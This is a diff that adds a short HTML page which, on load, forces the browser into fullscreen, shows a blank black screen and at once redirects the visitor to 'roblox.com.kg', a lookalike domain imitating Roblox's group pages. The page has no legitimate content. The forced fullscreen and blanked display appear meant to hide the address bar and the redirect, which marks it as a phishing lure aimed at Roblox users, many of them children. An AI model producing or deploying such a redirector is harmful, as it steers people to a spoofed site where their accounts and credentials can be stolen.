@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0;url=https://www.roblox.com.kg/groups/1825331090/">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            background-color: black;
+            color: black;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+    </style>
+    <script>
+        function enterFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
+        window.onload = function() {
+            enterFullscreen();
+            // Redirect after fullscreen is requested
+            setTimeout(function() {
+                window.location.href = "https://www.roblox.com.kg/groups/1825331090/";
+            }, 100); // Small delay to ensure fullscreen request has time to be processed
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
